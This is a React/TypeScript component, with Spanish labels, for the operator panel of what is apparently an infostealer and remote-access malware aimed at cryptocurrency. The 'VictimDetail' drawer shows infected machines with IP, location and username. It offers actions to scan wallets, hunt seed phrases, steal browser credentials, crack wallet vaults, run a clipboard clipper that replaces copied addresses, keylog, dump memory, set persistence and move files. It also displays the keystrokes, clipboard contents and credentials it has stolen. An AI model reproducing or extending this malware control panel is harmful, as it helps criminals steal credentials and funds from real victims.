'use client';
import { useEffect, useState } from 'react';
import {
  Archive, Camera, CheckCircle2, Copy, ExternalLink, FileSearch, FolderOpen, KeyRound,
  Loader2, MessageSquare, Monitor, RefreshCw, Search, ShieldOff, Tag, TerminalSquare,
  Wallet as WalletIcon, X, AlertTriangle
} from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import { toast } from 'sonner';
import type { Artifact, ClipboardEntry, Keylog, Task, VaultResponse, Victim } from '@/lib/types';
import { ago, copy, dateTime, flag, osIcon, osTone, short } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { VaultList } from '@/components/vault-list';
import { CredentialTable } from '@/components/credential-table';
import { FileTree } from '@/components/file-tree';
import { EventFeed } from '@/components/event-feed';
import { ChatPanel } from '@/components/chat-panel';
import { MonitorPanel } from '@/components/monitor-panel';
import { cn } from '@/lib/cn';
import { ACTION_MAP } from '@/lib/actions';

export type DetailTab = 'resumen' | 'boveda' | 'ficheros' | 'actividad' | 'monitor' | 'chat';

type OpenWallet = { name: string; pid: number | null; at: string };

function OpenWallets({ victim }: { victim: Victim }) {
  const live = useLiveContext();
  const last = live.events[0];
  const { data, refresh } = useApi<{ items: OpenWallet[] }>(`/victims/${victim.id}/open-wallets`, { pollMs: 15_000 });
  useEffect(() => {
    if (last?.victimId === victim.id && ['event.new', 'wallet_detected', 'wallet_closed'].includes(last.type)) refresh();
  }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps
  const items = data?.items ?? [];
  return (
    <section className="xp-card rounded-lg border border-line bg-panel/30 p-2">
      <div className="flex items-center gap-2">
        <p className="text-2xs uppercase tracking-wide text-muted">Wallets abiertas ahora</p>
        <span className="ml-auto text-2xs text-muted/60">se refresca con el agente</span>
      </div>
      {items.length === 0 ? <p className="mt-1 text-2xs text-muted">Ninguna billetera en ejecución detectada en la última hora.</p> : (
        <div className="mt-1 flex flex-wrap gap-1">
          {items.map((item) => <Badge key={`${item.name}-${item.pid}`} tone="ok"><WalletIcon className="h-2.5 w-2.5" />{item.name}{item.pid ? ` · ${item.pid}` : ''}</Badge>)}
        </div>
      )}
    </section>
  );
}
type ActivityTab = 'keylogger' | 'portapapeles' | 'credenciales' | 'eventos';

const TABS: Array<{ id: DetailTab; label: string }> = [
  { id: 'resumen', label: 'Resumen' },
  { id: 'boveda', label: 'Bóveda' },
  { id: 'ficheros', label: 'Ficheros' },
  { id: 'actividad', label: 'Actividad' },
  { id: 'monitor', label: 'Monitor' },
  { id: 'chat', label: 'Chat' }
];

type ActionCardState = 'idle' | 'queued' | 'running' | 'done' | 'error' | 'cancelled';

function ActionCard({
  title, result, icon: Icon, state, error, disabled, reason, onRun, onCancel, onView
}: {
  title: string;
  result: string;
  icon: typeof WalletIcon;
  state: ActionCardState;
  error?: string | null;
  disabled: boolean;
  reason?: string;
  onRun: () => void;
  onCancel: () => void;
  onView: () => void;
}) {
  const busy = state === 'queued' || state === 'running';
  return (
    <div className={cn('xp-card flex flex-col rounded-xl border border-line bg-panel/50 p-3', busy && 'border-warn/40', state === 'done' && 'border-ok/40')}>
      <div className="flex items-start gap-2">
        <div className={cn('xp-card-icon grid h-10 w-10 shrink-0 place-items-center rounded-lg bg-panel-2 text-muted', state === 'done' && 'bg-ok/10 text-ok', busy && 'bg-warn/10 text-warn')}>
          {state === 'done' ? <CheckCircle2 className="h-5 w-5" /> : busy ? <Loader2 className="h-5 w-5 animate-spin" /> : <Icon className="h-5 w-5" />}
        </div>
        <div className="min-w-0 flex-1">
          <p className="text-sm font-semibold text-ink">{title}</p>
          <p className="mt-0.5 text-2xs text-muted">{busy ? 'Ejecutando…' : state === 'done' ? 'Completado' : state === 'error' ? (error || 'Error') : result}</p>
        </div>
      </div>
      {busy ? <div className="mt-3 h-1 overflow-hidden rounded bg-warn/20"><div className="h-full w-1/3 animate-shimmer bg-warn" /></div> : null}
      <div className="mt-3 flex gap-1.5">
        {busy ? <Button size="sm" variant="secondary" onClick={onCancel}>Cancelar</Button> : state === 'done' ? <Button size="sm" variant="secondary" onClick={onView}>Ver resultados</Button> : (
          <Button size="sm" disabled={disabled} title={disabled ? reason : undefined} onClick={onRun}>{state === 'error' ? 'Reintentar' : 'Ejecutar'}</Button>
        )}
      </div>
    </div>
  );
}

export function VictimDetail({
  victim, tab, onTab, onAction, onRun, onClose, onBulk
}: {
  victim: Victim;
  tab: DetailTab;
  onTab: (tab: DetailTab) => void;
  onAction: (id: string) => void;
  onRun: (id: string) => Promise<string | null>;
  onClose: () => void;
  onBulk: () => void;
}) {
  const [keyQuery, setKeyQuery] = useState('');
  const [clipQuery, setClipQuery] = useState('');
  const [activity, setActivity] = useState<ActivityTab>('eventos');
  const [pending, setPending] = useState<Record<string, string>>({});
  const [starting, setStarting] = useState('');
  const vault = useApi<VaultResponse>(`/victims/${victim.id}/vault`, { pollMs: 10_000 });
  const files = useApi<{ artifacts: Artifact[] }>(`/victims/${victim.id}/files`);
  const keylogs = useApi<{ items: Keylog[] }>(`/victims/${victim.id}/keylogs?q=${encodeURIComponent(keyQuery)}&limit=200`);
  const clipboard = useApi<{ items: ClipboardEntry[] }>(`/victims/${victim.id}/clipboard?q=${encodeURIComponent(clipQuery)}`);
  const screenshots = useApi<{ items: Array<{ id: string; ts: string }> }>(`/victims/${victim.id}/screenshots`);
  const tasks = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&limit=40`, { pollMs: 4_000 });
  const offline = !victim.socket;
  const disabled = offline || !ACTION_MAP.get('scan');
  const counters = vault.data?.counters;
  const lastScan = vault.data?.lastScan;

  const TASK_FOR: Record<string, string> = { scan: 'scan_wallets', 'find-seeds': 'scan_wallets', 'capture-creds': 'harvest', screenshot: 'screenshot' };

  function taskFor(actionId: string): Task | undefined {
    const pendingId = pending[actionId];
    const rows = tasks.data?.items ?? [];
    if (pendingId) {
      const direct = rows.find((row) => row.id === pendingId);
      if (direct) return direct;
    }
    const name = TASK_FOR[actionId];
    if (!name) return undefined;
    return rows.find((row) => {
      if (row.name !== name) return false;
      if (actionId === 'find-seeds') {
        const params = row.params as { include_seeds?: boolean; include_extensions?: boolean };
        return params.include_seeds === true && params.include_extensions === false;
      }
      if (actionId === 'scan') {
        const params = row.params as { include_seeds?: boolean; include_extensions?: boolean };
        return !(params.include_seeds === true && params.include_extensions === false);
      }
      if (actionId === 'capture-creds') return (row.params as { kind?: string }).kind === 'browsers';
      return true;
    });
  }

  function stateFor(actionId: string): ActionCardState {
    const state = taskFor(actionId)?.status;
    if (state === 'queued' || state === 'running' || state === 'done' || state === 'error' || state === 'cancelled') return state;
    return 'idle';
  }

  async function run(actionId: string) {
    setStarting(actionId);
    try {
      const id = await onRun(actionId);
      if (id) setPending((current) => ({ ...current, [actionId]: id }));
      toast.success('Acción encolada');
      tasks.refresh();
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'No se pudo encolar');
    } finally {
      setStarting('');
    }
  }

  async function cancel(actionId: string) {
    const id = taskFor(actionId)?.id;
    if (!id) return;
    try {
      await mutate(`/tasks/${id}/cancel`, 'POST');
      tasks.refresh();
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'No se pudo cancelar');
    }
  }

  return (
    <aside className="flex h-full min-h-0 w-full flex-col bg-panel" aria-label={`Detalle de ${victim.hostname}`}>
      <div data-xp-drawer-head className="shrink-0 border-b border-line/80 bg-panel/80 p-4 backdrop-blur">
        <div className="flex items-start gap-2">
          <div className="min-w-0 flex-1">
            <p className="truncate font-mono text-base font-semibold text-ink">{victim.hostname}</p>
            <p className="truncate font-mono text-2xs text-muted">{victim.username} · {short(victim.id)}</p>
          </div>
          <Button size="icon" variant="ghost" onClick={onClose} title="Cerrar detalle" aria-label="Cerrar detalle"><X className="h-4 w-4" /></Button>
        </div>
        <div className="mt-1.5 flex flex-wrap items-center gap-1">
          <Badge tone={victim.online ? 'ok' : victim.revokedAt ? 'bad' : 'warn'}>{victim.online ? 'online' : victim.status}</Badge>
          <Badge tone={victim.socket ? 'ok' : 'warn'}>{victim.socket ? 'socket' : 'sin socket'}</Badge>
          <Badge>{osIcon(victim.os)} {victim.os}</Badge>
          <Badge tone="brand">{victim.profile}</Badge>
          <span className="ml-auto text-2xs text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</span>
        </div>
      </div>

      <Tabs value={tab} onValueChange={(value) => onTab(value as DetailTab)} className="flex min-h-0 flex-1 flex-col">
        <TabsList className="shrink-0 overflow-x-auto border-b border-line/80 bg-panel/60 px-2">
          {TABS.map((item) => <TabsTrigger key={item.id} value={item.id} className="shrink-0 whitespace-nowrap px-3 py-2">{item.label}</TabsTrigger>)}
        </TabsList>
        <div className="scroll-panel min-h-0 flex-1 p-4">
          <TabsContent value="resumen" className="mt-0 space-y-4">
            <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
              <ActionCard
                title="Escanear wallets" icon={WalletIcon} state={stateFor('scan')} error={taskFor('scan')?.error}
                disabled={disabled || starting === 'scan'} reason="Equipo sin socket de control"
                result={lastScan ? `Último: ${lastScan.name} · ${ago(lastScan.finishedAt ?? lastScan.createdAt)}` : 'Inventario de carteras y vaults'}
                onRun={() => void run('scan')} onCancel={() => void cancel('scan')} onView={() => onTab('boveda')}
              />
              <ActionCard
                title="Buscar seeds" icon={Search} state={stateFor('find-seeds')} error={taskFor('find-seeds')?.error}
                disabled={disabled || starting === 'find-seeds'} reason="Equipo sin socket de control"
                result={counters ? `${counters.seeds} seeds en bóveda` : 'Barrido de ficheros y vaults'}
                onRun={() => void run('find-seeds')} onCancel={() => void cancel('find-seeds')} onView={() => onTab('boveda')}
              />
              <ActionCard
                title="Capturar credenciales" icon={KeyRound} state={stateFor('capture-creds')} error={taskFor('capture-creds')?.error}
                disabled={disabled || starting === 'capture-creds'} reason="Equipo sin socket de control"
                result={counters ? `${counters.credentials} credenciales guardadas` : 'Navegadores y almacenes de login'}
                onRun={() => void run('capture-creds')} onCancel={() => void cancel('capture-creds')} onView={() => { setActivity('credenciales'); onTab('actividad'); }}
              />
              <ActionCard
                title="Screenshot" icon={Camera} state={stateFor('screenshot')} error={taskFor('screenshot')?.error}
                disabled={disabled || starting === 'screenshot'} reason="Equipo sin socket de control"
                result="Captura puntual de pantalla"
                onRun={() => void run('screenshot')} onCancel={() => void cancel('screenshot')} onView={() => onTab('monitor')}
              />
            </div>

            <OpenWallets victim={victim} />

            <div className="grid grid-cols-3 gap-2 sm:grid-cols-6">
              {[
                ['wallets', counters?.wallets], ['targets', counters?.targets], ['seeds', counters?.seeds],
                ['claves', counters?.keys], ['contraseñas', counters?.passwords], ['creds', counters?.credentials]
              ].map(([label, value]) => (
                <button key={label} className="xp-stat rounded-lg border border-line bg-panel/40 px-2 py-1.5 text-left hover:bg-panel-2" onClick={() => onTab('boveda')}>
                  <p className="text-2xs text-muted">{label}</p>
                  <p className="num text-lg text-ink">{value ?? '—'}</p>
                </button>
              ))}
            </div>

            <dl className="grid grid-cols-[96px_1fr] gap-y-1.5 text-xs">
              <dt className="text-muted">Equipo</dt><dd className="font-mono">{victim.hostname}</dd>
              <dt className="text-muted">Usuario</dt><dd className="font-mono">{victim.username}</dd>
              <dt className="text-muted">SO</dt><dd className={osTone(victim.os)}>{victim.os} {victim.osVersion} · {victim.arch}</dd>
              <dt className="text-muted">Agente</dt><dd className="font-mono">{victim.agentVersion || '—'}</dd>
              <dt className="text-muted">Identidad</dt>
              <dd><Badge className={cn(victim.identityState === 'confirmed' && 'border-ok/40 text-ok')}>{victim.identityState ?? 'confirmed'}</Badge><span className="ml-2 font-mono text-muted">epoch {victim.keyEpoch ?? 1}</span></dd>
              <dt className="text-muted">Build</dt><dd className="font-mono">{victim.build?.name ?? '—'} v{victim.build?.version ?? '—'}</dd>
              <dt className="text-muted">IP</dt><dd className="font-mono">{victim.ip ?? '—'} <button aria-label="Copiar IP" onClick={() => { copy(victim.ip ?? ''); toast.success('IP copiada'); }}><Copy className="inline h-2.5 w-2.5" /></button></dd>
              <dt className="text-muted">País</dt><dd>{flag(victim.countryCode)} {victim.country ?? '—'} {victim.city ? `· ${victim.city}` : ''}</dd>
              <dt className="text-muted">Primera vez</dt><dd className="font-mono">{dateTime(victim.firstSeenAt)}</dd>
              <dt className="text-muted">Última señal</dt><dd className="font-mono">{dateTime(victim.lastHeartbeatAt)} ({ago(victim.lastHeartbeatAt)})</dd>
              <dt className="text-muted">Último escaneo</dt><dd className="font-mono">{lastScan ? `${lastScan.name} · ${lastScan.status} · ${ago(lastScan.finishedAt ?? lastScan.createdAt)}` : '—'}</dd>
              <dt className="text-muted">Grupo</dt><dd>{victim.tags.length ? victim.tags.map((tag) => <Badge key={tag} className="mr-1">{tag}</Badge>) : '—'}</dd>
            </dl>

            {victim.health ? <p className="xp-notice xp-notice-bad rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad"><AlertTriangle className="mr-1 inline h-3 w-3" />Módulo degradado en los últimos 10 min: <span className="font-mono">{victim.health}</span>. Revisa la pestaña Actividad antes de fiarte del escaneo.</p> : null}
            {!victim.socket ? <p className="xp-notice xp-notice-warn rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">Sin socket de control: las acciones se rechazarán con <span className="font-mono">agent_offline</span>. El estado online solo refleja el último heartbeat.</p> : null}
            {lastScan?.error ? <p className="xp-notice xp-notice-bad rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad"><AlertTriangle className="mr-1 inline h-3 w-3" />{lastScan.error}</p> : null}

            <details className="xp-card rounded-lg border border-line bg-panel/30 p-2">
              <summary className="cursor-pointer text-xs text-muted">Opciones avanzadas</summary>
              <div className="mt-2 flex flex-wrap gap-1.5">
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('scan')}>Opciones de escaneo</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest')}><Archive className="h-3 w-3" /> Harvest completo</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('hives')}><TerminalSquare className="h-3 w-3" /> Hives</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-discord')}>Discord</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-telegram')}>Telegram</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-wifi')}>WiFi</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('dump')}>Extraer vault</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('crack')}>Romper vault</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('clip-start')}>Iniciar clipper</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('clip-stop')}>Parar clipper</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('watch-on')}>Vigilar wallets</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('watch-off')}>Dejar de vigilar</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('processes')}><TerminalSquare className="h-3 w-3" /> Procesos</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('memdump')}>Volcar memoria</Button>
                <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('persist-on')}>Persistir</Button>
                <Button size="sm" variant="secondary" onClick={() => onAction('tags')}><Tag className="h-3 w-3" /> Nota</Button>
                <Button size="sm" variant="secondary" onClick={onBulk}>Lote</Button>
                <Button size="sm" variant="destructive" onClick={() => onAction('revoke')}><ShieldOff className="h-3 w-3" /> Revocar</Button>
              </div>
            </details>
            {victim.lat != null ? <a className="flex items-center gap-1 text-2xs text-brand" target="_blank" rel="noreferrer" href={`https://www.openstreetmap.org/?mlat=${victim.lat}&mlon=${victim.lon}#map=12/${victim.lat}/${victim.lon}`}>mapa <ExternalLink className="h-2.5 w-2.5" /></a> : null}
          </TabsContent>

          <TabsContent value="boveda" className="mt-0">
            <VaultList victimId={victim.id} onAction={onAction} disabled={offline} />
          </TabsContent>

          <TabsContent value="ficheros" className="mt-0">
            <div className="mb-2 flex flex-wrap gap-1">
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('download')}><FileSearch className="h-3 w-3" /> descargar</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('search')}><Search className="h-3 w-3" /> buscar</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('upload')}>subir</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('compress')}>comprimir</Button>
              <Button size="sm" variant="ghost" aria-label="Refrescar ficheros" onClick={files.refresh}><RefreshCw className="h-3 w-3" /></Button>
            </div>
            {files.error ? <ErrorState message={files.error.message} retry={files.refresh} /> : <FileTree artifacts={files.data?.artifacts ?? []} onDeleted={files.refresh} />}
          </TabsContent>

          <TabsContent value="actividad" className="mt-0 space-y-2">
            <div className="flex flex-wrap gap-1">
              {([['eventos', 'Eventos'], ['keylogger', 'Keylogger'], ['portapapeles', 'Portapapeles'], ['credenciales', 'Credenciales']] as Array<[ActivityTab, string]>).map(([id, label]) => (
                <button key={id} className="chip" data-active={activity === id} onClick={() => setActivity(id)}>{label}</button>
              ))}
            </div>
            {activity === 'keylogger' ? (
              <>
                <input value={keyQuery} onChange={(event) => setKeyQuery(event.target.value)} placeholder="buscar texto o ventana" className="h-7 w-full rounded border border-line bg-bg px-2 font-mono text-xs" />
                {keylogs.loading ? <SkeletonRows rows={8} cols={2} /> : (keylogs.data?.items ?? []).length === 0 ? (
                  <Empty title="Sin keylogs" hint="El keylogger se activa con la tarea agent keys on y se vuelca con keys dump." action={<Button size="sm" onClick={() => onAction('harvest')}>volcar ahora</Button>} />
                ) : (keylogs.data!.items).map((row) => (
                  <div key={row.id} className="border-b border-line/50 py-1">
                    <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.title}{row.count && row.count > 1 ? ` · ×${row.count}` : ''}</p>
                    <p className={cn('break-all font-mono text-xs', row.password && 'text-warn')}>{row.text}</p>
                  </div>
                ))}
              </>
            ) : null}
            {activity === 'portapapeles' ? (
              <>
                <input value={clipQuery} onChange={(event) => setClipQuery(event.target.value)} placeholder="buscar portapapeles" className="h-7 w-full rounded border border-line bg-bg px-2 font-mono text-xs" />
                {clipboard.loading ? <SkeletonRows rows={8} cols={2} /> : (clipboard.data?.items ?? []).length === 0 ? (
                  <Empty title="Sin portapapeles" hint="Arranca el clipper para registrar cambios y secretos copiados." action={<Button size="sm" onClick={() => onAction('clip-start')}>iniciar clipper</Button>} />
                ) : (clipboard.data!.items).map((row) => (
                  <div key={row.id} className="flex items-start gap-2 border-b border-line/50 py-1">
                    <Badge tone={row.kind === 'text' ? 'default' : 'brand'}>{row.kind}</Badge>
                    <div className="min-w-0 flex-1"><p className="break-all font-mono text-xs">{row.content}</p><p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.window}{row.replaced ? ` · reemplazado → ${row.replaced}` : ''}</p></div>
                    <Button size="icon" variant="ghost" aria-label="Copiar" onClick={() => copy(row.content)}><Copy className="h-3 w-3" /></Button>
                  </div>
                ))}
              </>
            ) : null}
            {activity === 'credenciales' ? <CredentialTable victimId={victim.id} /> : null}
            {activity === 'eventos' ? <EventFeed victim={victim.id} limit={120} /> : null}
          </TabsContent>

          <TabsContent value="monitor" className="mt-0">
            <MonitorPanel victim={victim} />
            <div className="mb-2 mt-3 flex items-center justify-between border-t border-line pt-2">
              <p className="text-2xs uppercase tracking-wide text-muted">Capturas</p>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('screenshot')}><Monitor className="h-3 w-3" /> capturar</Button>
            </div>
            {(screenshots.data?.items ?? []).length === 0 ? (
              <Empty title="Sin capturas" hint="La captura puntual usa screenshot. El streaming continuo llega con el módulo monitor." action={<Button size="sm" onClick={() => onAction('screenshot')}>primera captura</Button>} />
            ) : (
              <div className="grid grid-cols-2 gap-2">
                {(screenshots.data!.items).map((shot) => (
                  <a key={shot.id} href={`/api/console/screenshots/${shot.id}/image`} target="_blank" rel="noreferrer" className="group overflow-hidden rounded border border-line">
                    <img src={`/api/console/screenshots/${shot.id}/image`} alt={`captura ${shot.ts}`} loading="lazy" className="aspect-video w-full object-cover group-hover:opacity-80" />
                    <p className="p-1 text-2xs text-muted">{dateTime(shot.ts)}</p>
                  </a>
                ))}
              </div>
            )}
          </TabsContent>

          <TabsContent value="chat" className="mt-0"><ChatPanel victim={victim} /></TabsContent>
        </div>
      </Tabs>
      <div className="sr-only" aria-live="polite">{tasks.data?.items.length ?? 0} tareas</div>
      <FolderOpen className="hidden" />
      <MessageSquare className="hidden" />
    </aside>
  );
}
